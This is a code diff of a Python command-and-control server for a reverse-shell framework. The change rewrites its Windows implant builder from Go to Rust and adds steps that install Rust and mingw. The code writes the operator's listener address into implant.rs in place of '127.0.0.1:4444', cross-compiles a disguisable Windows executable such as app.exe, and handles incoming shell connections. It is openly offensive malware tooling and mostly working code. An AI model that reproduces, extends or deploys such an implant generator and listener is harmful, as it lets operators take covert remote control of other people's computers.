@@ -3,14 +3,17 @@ import socket
 import subprocess
 import threading  # Used to handle multiple connections
 import time
-from tabulate import tabulate  # Used to display tables
-
+from tabulate import tabulate  # Used to display tabless
+import shutil
+import platform
 
 try:
     import readline
 except Exception:
     import pyreadline
 
+rust_installed = False  # This becomes true if rust is installed in the system
+operating_system = "Linux"  # Its initial value is linux but it will detect your os inorder to download rust
 sessions = []  # Array of sessions used while interaction
 connections = []  # Array of connections [Used to handle connections]
 conn_id = 1  # connection id, number of connections received
@@ -120,6 +123,7 @@ def handle_connection(conn, conn_id):
                 response = response.split("\n")
 
                 response = response[:-1]
+                response = response[:-1]
                 if len(response) >= 1 and response[-1] == '':
                     response = response[:-1]
                 for i in range(len(response)):
@@ -137,11 +141,117 @@ Exit prompt
 def exit_program():
     confirm_exit = input("Are you sure you want to exit the program [y/n]: ")
     if confirm_exit.lower() == "y" or confirm_exit.lower() == "yes":
-        exit(0)
+        print("[*] Bye")
+        os._exit(0)
     elif confirm_exit.lower() == "n" or confirm_exit.lower() == "no":
         print()
     else:
         exit_program()
+
+"""
+This function is used to detect is some package is installed
+We will be basically using this function to check if rust is installed or not
+"""
+def package_check(package_name):
+    check = subprocess.run(package_name, shell=True, capture_output=True)
+    
+    """I don't know why this standard way was not working
+        it was showing rust is not installed even if was installed
+        So I am writing my 'Jugaad' code below it"""
+    # if check.returncode == 0:
+    #     return True
+    # elif check.returncode == 1:
+    #     return False
+    
+    if len(check.stdout.decode().split()) > 5:
+        return True
+    else:
+        return False
+
+"""
+This code checks if Mingw-64 is installed in a linux type operating system.
+Mingw-64 is required to cross compile rust code into a windows binary.
+"""
+def mingw_64_check():
+    try:
+        output = subprocess.check_output(["dpkg", "-s", "mingw-w64"], stderr=subprocess.STDOUT)
+    except subprocess.CalledProcessError as e:
+        # If the dpkg command returns a non-zero exit code, the package is not installed
+        return False
+    else:
+        # If the dpkg command succeeds, check if the "Status" field contains "installed"
+        return True
+
+"""
+This code check if the INSTALLED mingw is configured with rustup.
+If it is not configured, then it will configure it.
+"""
+def rustup_mingw_configure():
+    output = subprocess.check_output("rustup target list", shell=True)
+    if "x86_64-pc-windows-gnu (installed)" not in output.decode():
+        print("\n[*] Configuring mingw64 with rustup, it is a one time process\n")
+        configure = subprocess.run("rustup target add x86_64-pc-windows-gnu", shell=True)
+        if configure.returncode == 0:
+            print("\n[+] Mingw is successfully configured with rustup\n")
+
+
+
+# The if else statement tells the OS user is using.
+# This will help us to install Rust in case it is not installed.
+if platform.system() == "Windows":
+    operating_system = "Windows"
+else:
+    operating_system = "Linux"
+
+# The code in below if statement installs mingw-w64 if it is not installed.
+if operating_system == "Linux" and not mingw_64_check():
+    print("[-] Mingw-w64 was not installed\n[*] You can install it manually by 'sudo apt-get install mingw-w64'\n")
+    wonna_install_mingw = input("[*] Want us to install it for you automatically [Y/n]: ")
+    if wonna_install_mingw.lower().strip() == "n" or  wonna_install_mingw.lower().strip() == "no":
+        print("[-] Mingw-w64 is required to use the program")
+        print("[*] Be back after installing it")
+        print("[*] Exiting...")
+        os._exit(0)
+    else:
+        ming_install_status = subprocess.run("sudo apt-get install mingw-w64 -y", shell=True)
+        if ming_install_status.returncode == 0:
+            print("\n[+] Mingw-w64 installed successfully!\n")
+
+
+rust_check = package_check("rustup")  # Checking if rustup is working
+cargo_check = package_check("cargo")  # Checking if cargo is working
+if rust_check and cargo_check:
+    rust_installed = True
+
+# The if statement below will install rust if it is not installed.
+if not rust_installed:
+    print("[-] Rust is not installed\n")
+    
+    rust_install = input("Do you want to install Rust:[Y/n]: ")
+    if rust_install.lower().strip() == "n" or rust_install.lower().strip() == "no":
+        print("[-] Rust is required to use this program")
+        print("[*] Exiting...")
+        os._exit(0)
+    else:
+        if operating_system == "Linux":
+            print("\n[*] Linux operating system detected\n")
+            lets_install_rust_in_linux = subprocess.run("chmod +x rust_install.sh && ./rust_install.sh -y", shell=True)
+            if lets_install_rust_in_linux.returncode == 0:
+                print("↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ Ignore this I have alerdy done this for you")
+                print("\n[+] Rust installed successfully!\n[*] PLEASE RESTART THE TERMINAL WINDOW TO ENSURE RUST IS WORKING\n")
+                os._exit(0)
+            
+        else:
+            print("[*] Windows operating system detected")
+            subprocess.run(".\\rust_install.bat")
+            lets_install_rust_in_windows = subprocess.run("chmod +x rust_install.sh && ./rust_install.sh -y", shell=True)
+            if lets_install_rust_in_windows.returncode == 0:
+                print("\n[+] Rust installed successfully!\n[*] PLEASE RESTART THE TERMINAL WINDOW TO ENSURE RUST IS WORKING\n")
+                os._exit(0)
+
+# configures rustup with mingw if it is not configured
+if operating_system == "Linux":
+    rustup_mingw_configure()
 
 
 PORT = input("Enter port on which you want to start the listener [default:4444]: ")
@@ -246,36 +356,49 @@ while True:
         IMPLANT_NAME = input("Enter name of the implant [default:app.exe]: ")
         if IMPLANT_NAME.strip() == "":
             IMPLANT_NAME = "app.exe"
-        with open("implant.go", "rb") as file:
+        
+        current_path = os.getcwd()
+        script_path = current_path + "/src/"
+        release_path = current_path + "/target/release" if operating_system == "Windows" else current_path + "/target/x86_64-pc-windows-gnu/release/"
+        os.chdir(script_path)
+        
+        with open("implant.rs", "rb") as file:
             lines = file.read().decode()
             lines = lines.replace("\r", "")
 
-            if "localhost" in lines:
-                lines = lines.replace("localhost", LHOST)
-
-            if "4444" in lines:
-                lines = lines.replace("\"4444\"", f"\"{LPORT}\"")
-
-        f = open("temp.go", "w")
+            if "127.0.0.1:4444" in lines:
+                lines = lines.replace("127.0.0.1:4444", f"{LHOST}:{LPORT}")
+        
+        f = open("main.rs", "w")
         f.writelines(lines)
         f.close()
+        
+        os.chdir(current_path)
+        
+        generate_command = "cargo build --release" if operating_system == "Windows" else "cargo build --release --target x86_64-pc-windows-gnu"
 
-        generate_command = f"go build -ldflags \"-H=windowsgui -X '-w -s -X main.version=1.0.0'\" -o {IMPLANT_NAME} temp.go"
+        output = subprocess.run(generate_command, shell=True)
+        os.chdir(script_path)
 
-        output = subprocess.run(
-            f"GOOS=windows GOARCH=amd64 {generate_command} || {generate_command}",
-            shell=True, capture_output=True)
-        os.remove("temp.go")
-
+        os.chdir(release_path)
+        
+        if IMPLANT_NAME.endswith(".exe"):
+            os.rename("app.exe", IMPLANT_NAME)
+            shutil.copy(IMPLANT_NAME, current_path)
+        else:
+            os.rename("app.exe", IMPLANT_NAME + ".exe")
+            shutil.copy(IMPLANT_NAME + ".exe", current_path)
+        
+        os.chdir(current_path)
+        shutil.rmtree("target")
+        
         if output.returncode == 0:
-            print(output.stdout.decode())
-
             if os.path.isfile(IMPLANT_NAME):
                 pass
             elif os.path.isfile(IMPLANT_NAME + ".exe"):
                 IMPLANT_NAME = IMPLANT_NAME + ".exe"
 
-            print(f"[+] Windows binary generated and saved as {IMPLANT_NAME}")
+            print(f"\n[+] Windows binary generated and saved as {IMPLANT_NAME}\n")
         else:
             print(output.stderr.decode())
             print("[-] Windows binary could not be generated")
